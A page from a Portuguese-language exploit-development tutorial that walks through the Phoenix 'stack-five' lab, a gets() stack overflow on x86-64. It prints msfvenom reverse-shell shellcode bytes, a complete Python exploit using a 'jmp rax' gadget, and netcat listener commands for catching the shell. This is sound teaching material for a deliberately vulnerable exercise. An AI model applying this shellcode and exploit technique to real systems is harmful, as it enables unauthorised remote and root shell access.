<!DOCTYPE HTML>
<html lang="pt-br" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Stack Five - Um Livrinho Sobre Exploit Dev</title>
        
        


        <!-- Custom HTML head -->
        


        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        
        <link rel="icon" href="../favicon.svg">
        
        
        <link rel="shortcut icon" href="../favicon.png">
        
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        
        <link rel="stylesheet" href="../css/print.css" media="print">
        

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        
        <link rel="stylesheet" href="../fonts/fonts.css">
        

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        

        
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item "><a href="../intro/Intro.html">Intro</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../intro/Aventura.html">Aventura</a></li></ol></li><li class="chapter-item "><li class="part-title">Stack</li><li class="spacer"></li><li class="chapter-item "><div>Phoenix e Protostar</div></li><li class="chapter-item "><div>Estilo OSCP</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Tib3rius BOF Prep</div></li><li class="chapter-item "><div>BrainPain</div></li></ol></li><li class="chapter-item "><div>Format Strings</div></li><li class="chapter-item "><div>Integer Overflow</div></li><li class="chapter-item "><div>Mitiga√ß√µes</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>DEP | W^X | NX</div></li><li class="chapter-item "><div>ASLR</div></li><li class="chapter-item "><div>Canaries</div></li></ol></li><li class="chapter-item "><div>Ret2LibC</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Explica√ß√£o</div></li><li class="chapter-item "><div>Pratica</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six (Ret2LibC)</div></li></ol></li></ol></li><li class="chapter-item "><div>ROP</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Explica√ß√£o</div></li><li class="chapter-item "><div>Pratica</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six (ROP)</div></li></ol></li></ol></li><li class="chapter-item "><div>ASLR</div></li><li class="chapter-item "><div>Canaries</div></li><li class="chapter-item affix "><li class="part-title">Heap</li><li class="spacer"></li><li class="chapter-item "><div>How to heap</div></li><li class="chapter-item affix "><li class="part-title">Misc</li><li class="spacer"></li><li class="chapter-item affix "><li class="part-title">Exploit Education</li><li class="chapter-item expanded "><a href="../phoenix/setup.html">Phoenix</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../phoenix/Stack.html">Stack</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../phoenix/StackZero.html">Stack Zero</a></li><li class="chapter-item "><a href="../phoenix/StackOne.html">Stack One</a></li><li class="chapter-item "><a href="../phoenix/StackTwo.html">Stack Two</a></li><li class="chapter-item "><a href="../phoenix/StackThree.html">Stack Three</a></li><li class="chapter-item "><a href="../phoenix/StackFour.html">Stack Four</a></li><li class="chapter-item expanded "><a href="../phoenix/StackFive.html" class="active">Stack Five</a></li><li class="chapter-item "><a href="../phoenix/StackSix.html">Stack Six</a></li></ol></li><li class="chapter-item "><div>Heap</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Heap Zero</div></li><li class="chapter-item "><div>Heap One</div></li><li class="chapter-item "><div>Heap Two</div></li><li class="chapter-item "><div>Heap Three</div></li></ol></li><li class="chapter-item "><div>Format</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Format Zero</div></li><li class="chapter-item "><div>Format One</div></li><li class="chapter-item "><div>Format Two</div></li><li class="chapter-item "><div>Format Three</div></li><li class="chapter-item "><div>Format Four</div></li></ol></li><li class="chapter-item "><div>Net</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Net One</div></li><li class="chapter-item "><div>Net Two</div></li><li class="chapter-item "><div>Net Three</div></li></ol></li><li class="chapter-item "><div>Final</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Final One</div></li><li class="chapter-item "><div>Final Two</div></li></ol></li></ol></li><li class="chapter-item "><div>Protostar</div></li><li class="chapter-item "><div>Nebula</div></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                        
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        
                        
                        <a href="https://github.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                        
                    </div>
                </div>

                
                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1><a class="header" href="#-objetivo" id="-objetivo">üéØ Objetivo</a></h1>
<p>Finalmente! Tudo isso para chegar no BOF SRP (classico) :D</p>
<p>Agora ta na hora de redirecionar o pointer para o nosso codigo malicioso (shellcode) para ganhar uma shell </p>
<h1><a class="header" href="#-dicas" id="-dicas">üí° Dicas</a></h1>
<p>A instru√ß√£o <code>0xCC</code> (<code>int3</code>) serve para no debugger (como o gdb), para quando o rip chegar nela, a execu√ß√£o pausar (<code>breakpoint</code>). Nos podemos usa-la para testar se
sequer conseguimos executar codigo, ou se o problema ta no shellcode: Se o debugger avisa que teve <code>SIGTRAP</code>, nos temos execu√ß√£o de c√≥digo :D</p>
<p>Banco de dados de shellcode: <a href="http://shell-storm.org/shellcode/files/">shell-storm</a></p>
<h1><a class="header" href="#-exploit" id="-exploit">üî• Exploit</a></h1>
<h2><a class="header" href="#analisando-o-programa" id="analisando-o-programa">Analisando o programa</a></h2>
<p><code>main()</code> printa o banner e chama <code>start_level()</code></p>
<p><code>start_level()</code> cria um buffer[<strong>128</strong>] e salva o output de <code>gets()</code> (<strong>inseguro</strong>)</p>
<p>Como voc√™ pode ver, n√£o exite <code>complete_level()</code></p>
<p>Para completar, precisamos executar nosso pr√≥prio codigo (<code>shellcode</code>) e conseguir uma shell (uma linha de comando)</p>
<h2><a class="header" href="#agora-em-asm-d-analise-estatica" id="agora-em-asm-d-analise-estatica">Agora em ASM :D (analise estatica)</a></h2>
<p>Normalmente, o gdb printa assim:</p>
<pre><code class="language-x86asm">   0x00000000004005a4 &lt;+0&gt;:	push   rbp
   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
</code></pre>
<p>Porem, eu removi os endere√ßos para simplificar, e s√≥ mantive os importantes!</p>
<p>Primeiro, vamos ver main</p>
<pre><code class="language-x86asm">gef&gt; disassemble main
push   rbp
mov    rbp,rsp                    &lt;- Prologo
sub    rsp,0x10
   
   
mov    DWORD PTR [rbp-0x4],edi
mov    QWORD PTR [rbp-0x10],rsi   &lt;- args de puts
mov    edi,0x400620
call   0x400400 &lt;puts@plt&gt;        &lt;- call puts
   
   
mov    eax,0x0                    &lt;- args de start_level (nenhum)
call   0x40058d &lt;start_level&gt;     &lt;- call start_level
   
   
mov    eax,0x0                    &lt;- exit code (codigo de saida, 0=sem erro)
leave                             &lt;- Epilogo  
</code></pre>
<p>Agora vamos ver start_level</p>
<pre><code class="language-x86asm">gef&gt; disassemble start_level 
push   rbp
mov    rbp,rsp                  &lt;- Prologo 
add    rsp,0xffffffffffffff80   
                                
   
lea    rax,[rbp-0x80]         &lt;- rax = Pointer para buffer[128]
mov    rdi,rax                &lt;- rdi = rax

0x000000000040059c &lt;+15&gt;:
call   0x4003f0 &lt;gets@plt&gt;    &lt;- call gets


nop
leave                         &lt;- Epilogo
ret
</code></pre>
<p>Agora vamos adicionar um breakpoint!</p>
<h3><a class="header" href="#breakpoint" id="breakpoint">Breakpoint</a></h3>
<blockquote>
<p>Breakpoint = ponto de pausa</p>
</blockquote>
<p>Antes daquela intru√ß√£o ser executada, sera substituida por <code>0xCC</code>. Isso faz o  debugger pausar a execu√ß√£o do programa naquela instru√ß√£o!</p>
<p>Quando continuamos executando (normalmente o comando √© <strong>continue</strong>), o <code>0xCC</code> √© substituido pela instru√ß√£o certa :D</p>
<p>Se voc√™ esta fora de um debugger, <code>0xCC</code> vai fazer o programa sair com erro</p>
<pre><code class="language-x86asm">gef&gt; b *0x000000000040059c
Breakpoint 1 at 0x40059c
</code></pre>
<p>&quot;b&quot; √© o comando do gdb para adionar um breakpoint \ 
A &quot;*&quot; tem haver com aquele dos pointers \ 
O endere√ßo √© para &quot;<code>call gets</code>&quot;</p>
<blockquote>
<p>Dica: se voc√™ selecionar/sublinhar (clique esquerdo e passa o mouse em cima, voc√™ sabe do que eu to falando), e clicar o bot√£o do meio no mouse (a rodinha) 
o terminal automaticamente da Ctrl-C Ctrl-V naquele valor para voc√™! Ent√£o n√£o precisa copiar o endere√ßo manualmente :D</p>
</blockquote>
<h2><a class="header" href="#agora-vamos-executar-o-programa-analise-dinamica" id="agora-vamos-executar-o-programa-analise-dinamica">Agora vamos executar o programa (analise dinamica)</a></h2>
<p>126 As n√£o causam erro, e 127 As causam... ue, mas pq? n√£o era pra dar erro s√≥ em 128?</p>
<pre><code class="language-bash">$ python3 -c &quot;print('A'*126)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education

$ python3 -c &quot;print('A'*127)&quot; | ./stack-five 
Welcome to phoenix/stack-five, brought to you by https://exploit.education
Segmentation fault
</code></pre>
<p>Isso vai ser muito importante no pr√≥ximo desafio: buffers s√£o terminados com um null byte!</p>
<p>Por enquanto, isso s√≥ nos mostra que o compilador n√£o adicionou nada no meio do caminho entre o buffer e o EBP+EIP Salvos :D</p>
<p>E n√≥s ja sabemos como controlar o EIP, ent√£o agora s√≥ precisamos saber para onde redirecionar a execu√ß√£o :)</p>
<h2><a class="header" href="#encontrar-endere√ßo-do-buffer" id="encontrar-endere√ßo-do-buffer">Encontrar endere√ßo do buffer</a></h2>
<p>Agora dentro do gdb (<strong>gdb stack-five</strong>)</p>
<blockquote>
<p>gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)</p>
<p>r √© o comand do gdb para rodar o programa!
Adicionando &quot;&lt;&lt;&lt;&quot; n√≥s podemos mandar uma string pro input! Tambem funciona com arquivos ( r &lt; nome_do_arquivo ) :D</p>
</blockquote>
<pre><code class="language-x86asm">gef&gt; r &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
Starting program: /opt/phoenix/amd64/stack-five &lt;&lt;&lt; $(python3 -c &quot;print('A'*100)&quot;)
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x000000000040059c in start_level ()

--- Output do gef ---
</code></pre>
<blockquote>
<p>gef √© uma extens√£o do gdb que vai te dar um monte de informa√ß√£o util quando voc√™ chegar num breakpoint</p>
</blockquote>
<p>O output do gef contem:
<img src="./img/gef_example.png" alt="" />
Porem, mais informa√ß√µes podem ser adicionadas! use <code>gef help</code> para ver como ele pode te ajudar :D </p>
<p>Caso o programa seja executado sem breakpoints e com muitos As, vamos receber uma SIGSEV informando que &quot;$PC&quot;(outro nome para RIP) n√£o pode ser redirecionado para &quot;41414141&quot;, confirmando que o nosso buffer overflow √© possivel (olha as linhas no final da segunda imagem)
<img src="./img/stack_five/gef_A_overflow_0.png" alt="" />
<img src="./img/stack_five/gef_A_overflow_1.png" alt="" /></p>
<p>Agora, vamos colocar o breakpoint em <code>call gets()</code> e executar o programa com 140 As
<img src="./img/stack_five/before_gets_0.png" alt="" /></p>
<p>As partes importante no output do gef s√£o:</p>
<p>registers
<img src="./img/stack_five/before_gets_3.png" alt="" /></p>
<p>argumentos (vazio: o pointer em RDI aponta para <strong>0x00007fffffffe5b0</strong>, que possui o valor 0x0000...,)
<img src="./img/stack_five/before_gets_1.png" alt="" /></p>
<blockquote>
<p>Lembrete de que pointer come√ßa com 2 NULL bytes ai :D 0x<strong>0000</strong>7fff....</p>
</blockquote>
<p>stack
<img src="./img/stack_five/before_gets_2.png" alt="" /></p>
<p>Voc√™ tambem acha que tem uma falta de AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ?? hehehe :P</p>
<p>(((Insira aquele meme muito velho da cabra gritando)))</p>
<p>Ent√£o vamos avan√ßar para pr√≥xima instru√ß√£o (step: <code>s</code>) :D
<img src="./img/stack_five/gef_after_gets_0.png" alt="" /></p>
<p>Isso quer dizer que aquele pointer dos argumentos (RDI) agora aponta para os As! :D</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffe5b0              -&gt; x/s √© o comando para printar strings
0x7fffffffe5b0:	'A' &lt;repete 140 vezes&gt;
</code></pre>
<p>Ent√£o nos ja temos o endere√ßo dos nossos As :D ... que em breve ser√£o shellcode :D</p>
<p>Mas agora precisamos saber com presi√ß√£o quantos As at√© o RIP, <code>info frame</code> vai nos ajudar com isso:</p>
<pre><code class="language-x86asm">gef&gt; info frame
Stack level 0, frame at 0x7fffffffe640:
 rip = 0x4005a1 in start_level  saved rip = 0x4005c7
 called by frame at 0x7fffffffe610
 Arglist at 0x7fffffffe630, args: 
 Locals at 0x7fffffffe630, Previous frame's sp is 0x7fffffffe640
 Saved registers:
  rbp at 0x7fffffffe630, rip at 0x7fffffffe638
</code></pre>
<p>A ultima linha √© a mais importante!</p>
<p>RIP em: <code>0x7fffffffe638</code></p>
<p>Ent√£o para encontrar precisamente quantos As precisamos colocar at√© chegarmos no RIP,
basta subtrair <code>endere√ßo do rip salvo - endere√ßo dos As</code></p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; 0x7fffffffe638 - 0x00007fffffffe5b0
136
</code></pre>
<p>Para confirmar isso, vamos rodar com 136 As + BBBB</p>
<p><img src="./img/stack_five/gef_136A_BBBB.png" alt="" /></p>
<p>RIP = BBBB (42424242) :D</p>
<h2><a class="header" href="#nop-sled" id="nop-sled">NOP sled</a></h2>
<p>Entretando, como nada pode ser simples nesse mundo do desenvolvimento de exploits, n√≥s n√£o conseguimos saber com precis√£o que o buffer vai estar naquela localiza√ß√£o :(</p>
<p>Isso ocorre pois as envs s√£o alocadas na stack. E elas variam muito, por exemplo, s√≥ de mudar o local de onde o programa esta sendo executado quebraria o nosso exploit.</p>
<blockquote>
<p>Dica: O gef pode nos ajudar a encontra-las
<img src="./img/stack_five/gef_envs_1.png" alt="" /></p>
</blockquote>
<p>Por exemplo:</p>
<p><img src="./img/stack_five/gef_envs_0.png" alt="" /></p>
<p>Para remediar isso, podemos usar um NOP sled (ou NOP slide) ! :D</p>
<p>(Outro metodo de remedia√ß√£o √© mencionado em <code>stack-six</code>)</p>
<p>NOP significa &quot;<strong>No</strong> <strong>OP</strong>eration&quot; (<strong>N</strong>enhuma <strong>OP</strong>era√ß√£o) ! √© uma instru√ß√£o que n√£o faz nada :D</p>
<p>A representa√ß√£o em machine code do NOP √© <code>0x90</code> :D Bem f√°cil de decorar, quem me dera escola fosse f√°cil assim hehehe :)</p>
<p>O processador vai fazer nada e passar para a pr√≥xima, e se n√≥s colocarmos varios desses em sequencia, o RIP vai &quot;deslizando&quot; atrav√©s at√© chegar no nosso c√≥digo!</p>
<p>Voc√™ pode imaginar um escorregador :D yuuuuupiii</p>
<p><img src="./img/panda_slide_1.gif" alt="" /></p>
<p>Ent√£o a gente redireciona o RIP para o meio do escorregador de NOPs, para ele delizar at√© o nosso c√≥digo :D</p>
<p>Assim, mesmo se o buffer estiverem em um endere√ßo diferente, o RIP vai chegar no nosso shellcode</p>
<p>Para testar isso, vamos usar o truque do <code>0xCC</code> mencionado anteriormente</p>
<p>O input que vai passar vai conter:</p>
<pre><code class="language-x86asm">NOP * 135
0xCC
Ender√ßo para ser colocado no RIP: 0x00007fffffffe5b0 + 70

70 = metade do escorregador (135)
</code></pre>
<p>E os <strong>breakpoints do gdb ser√£o removidos</strong>, ent√£o caso encontremos um breakpoint, foi o <code>0xCC</code> acima</p>
<pre><code class="language-x86asm">$ python3
&gt;&gt;&gt; hex(0x00007fffffffe5b0 + 70)
'0x7fffffffe5f6'                     - Little Endian -&gt; '\xb6\xe5\xff\xff\xff\x7f'
</code></pre>
<p>Agora executando:</p>
<pre><code class="language-x86asm">r &lt;&lt;&lt; $(python -c &quot;print '\x90' *135 + '\xcc' +'\xb6\xe5\xff\xff\xff\x7f'&quot;)
</code></pre>
<p>Nos recebemos uma SIGTRAP (chegou no breakpoint)</p>
<pre><code class="language-x86asm">[#0] Id 1, Name: &quot;stack-five&quot;, stopped, reason: SIGTRAP
</code></pre>
<p>E na se√ß√£o <code>code</code> do gef
<img src="./img/stack_five/gef_run_xCC.png" alt="" />
Meio dificil de ver, mas tem:</p>
<pre><code class="language-x86asm">NOP
NOP
INT3
(bad)
(bad)
</code></pre>
<blockquote>
<p>int3 √© o nome de 0xCC, da mesma maneira que NOP √© o nome de 0x90 </p>
</blockquote>
<p>Apos a nossa ultima intru√ß√£o ha intru√ß√µes invalidas <code>(bad)</code> que eram o nosso pointer, e logo em seguida o resto do programa normal! :D</p>
<h2><a class="header" href="#shellcode" id="shellcode">Shellcode</a></h2>
<p>Shellcode √© o codigo malicioso que vai ser executado ( normalmente te dando uma shell (terminal) n√£o autorizada )</p>
<p>Nos podemos usar os do link citado na dica, ou gerar uma usando <code>msfvenom</code> (ja vem instalado no kali linux)</p>
<blockquote>
<p>msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 --platform linux -a x64 -f python --var-name buf</p>
</blockquote>
<pre><code>No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of python file: 373 bytes
buf =  b&quot;&quot;
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

</code></pre>
<p>Agora, vamos fazer um exploit mais bem feito! <code>vim /tmp/gerar_exploit.py</code></p>
<pre><code class="language-python">buf =  b&quot;&quot;

# shellcode
buf += b&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += b&quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += b&quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += b&quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += b&quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += b&quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# NOP Sled para completar o resto do tamanho
buf = '\x90'*(136-len(buf)) + buf

# ret
buf += b'\xb6\xe5\xff\xff\xff\x7f' 


open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>O script /tmp/gerar_exploit.py vai gerar o que colocariamos no input, mas ao enves de printarmos para o terminal, vamos salvar em um arquivo binario (por isso o &quot;<code>wb</code>&quot; no <code>open</code>)! </p>
<p>Depois √© s√≥ ler esse arquivo e redireciona-lo <code>cat /tmp/exploit | ./stack-five</code> </p>
</blockquote>
<p>Porem, se tentamos executar esse exploit, recebemos <code>SIGSEV: viola√ß√£o de segmento</code></p>
<h2><a class="header" href="#corrigindo-o-problema" id="corrigindo-o-problema">Corrigindo o problema</a></h2>
<p>Nessa eu empaquei, e a solu√ß√£o veio daqui: <a href="https://blog.lamarranet.com/index.php/exploit-education-phoenix-stack-five-solution/">blog lamarranet</a></p>
<p>Ent√£o valeu pela ajuda :D</p>
<p>Ao enves de colocar o endere√ßo do buffer diretamente no RIP, vamos achar algo no programa original que aponte para ele: um <code>jmp esp</code> por exemplo</p>
<p>E o beneficio √© que, por estarmos pulando para uma parte estatica, e usando-a para redirecionar para o buffer, n√£o corremos o risco do buffer mudar de endere√ßo!</p>
<p>Isso quer dizer que n√£o precisamos mais do NOP slide :D </p>
<h3><a class="header" href="#rop-gadgets" id="rop-gadgets">ROP Gadgets</a></h3>
<p>Essa √© uma tecnica chamada programa√ß√£o <code>ROP</code>, que sera discutida em tutoriais futuros :D  Mas o que voc√™ precisa saber por enquanto √© que cada um desses <code>jmps</code> √© chamado de <strong>gadget</strong></p>
<p>Gadgets s√£o instru√ß√µes em outras partes do programa, que s√£o reaproveitadas por nos. Geralmente executar algo e pular para outro gadget!</p>
<p>Para achar esse jmp que nos ajudaria, podemos usar uma ferramenta chamda <code>ROPgadget</code></p>
<pre><code class="language-x86asm">$ ROPgadget --binary stack-five --only &quot;jmp&quot;
Gadgets information
============================================================
0x0000000000400481 : jmp rax

Unique gadgets found: 1
</code></pre>
<p>Isso quer dizer que, ao pular para <code>0x400481</code>, vamos executar <code>jmp rax</code> e acabar pulando para rax! e para onde rax aponta?</p>
<p>Colocando um break antes do ret de <code>start_level</code>, podemos ver que antes de retornar, rax aponta para o mesmo endere√ßo que rsp, e convenientemente o incio do nosso buffer
<img src="./img/stack_five/gef_rax.png" alt="" /></p>
<p>rax,rdi e rsp apontam para o inicio do buffer dos As</p>
<p>Assim, n√£o vamos mais precisar do NOP slide: temos um exploit que 100% dos casos vai apontar para o inicio do buffer!</p>
<p>S√≥ precisamos colocar <code>padding</code> entre o shellcode e o RIP</p>
<p>Ent√£o vamos modificar o exploit :D</p>
<pre><code>Dica: Shellcode+AAAAA+ret, Little Endian, 136 bytes ate RIP

Se voc√™ n√£o quiser ver a solu√ß√£o enquanto tenta!
.
.
.
.
.
.
.
.
.
.
.
</code></pre>
<pre><code class="language-python">buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Padding
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<blockquote>
<p>Eu removi o <strong>b&quot;&quot;</strong> pq tava dando problema :(</p>
</blockquote>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
<p>Agora, no terminal 1 deve ter uma shell :D</p>
<p><img src="./img/stack_five/Exploit_working.png" alt="" /></p>
<blockquote>
<p>Dica: <code>bash -ip</code> vai deixar a sua shell mais usavel</p>
</blockquote>
<p>Se nos tivessemos executado o programa como root, a nossa shell teria esses privilegios elevados ! :D</p>
<p><img src="./img/stack_five/root_exploit.png" alt="" /></p>
<p><code>UID = 0</code> quer dizer que possuimos privilegios de root, mesmo que o <code>whoami</code> n√£o tenha dito root</p>
<p>E se o programa estivesse exposto para a rede, poderiamos conseguir uma root shell remota :D (spoiler para os proximos desafios hehehe)</p>
<hr />
<p>Voc√™ chegou at√© aqui :D</p>
<p>Toma mais um gif de panda como presente</p>
<p><img src="./img/panda_slide_0.gif" alt="" /></p>
<h1><a class="header" href="#-solu√ß√£o" id="-solu√ß√£o">üí´ Solu√ß√£o</a></h1>
<blockquote>
<p>vim /tmp/gerar_exploit.py</p>
</blockquote>
<pre><code>buf =  &quot;&quot;

# shellcode
buf += &quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48&quot;
buf += &quot;\x97\x48\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48&quot;
buf += &quot;\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e&quot;
buf += &quot;\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58&quot;
buf += &quot;\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48&quot;
buf += &quot;\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;

# Filler
buf += 'A' * (136 - len(buf))

# ret
buf += '\x81\x04\x40' # Aponta para jmp rax

open(&quot;/tmp/exploit&quot;,&quot;wb&quot;).write(buf)
</code></pre>
<p>Agora basta gerar o exploit: <code>python /tmp/gerar_exploit.py</code></p>
<p>Abrir um novo terminal: <code>ssh -p 2222 user@localhost</code></p>
<p>Terminal 1: <code>nc -lvnp 4444</code></p>
<p>Terminal 2: <code>cat /tmp/exploit | ./stack-five</code> </p>
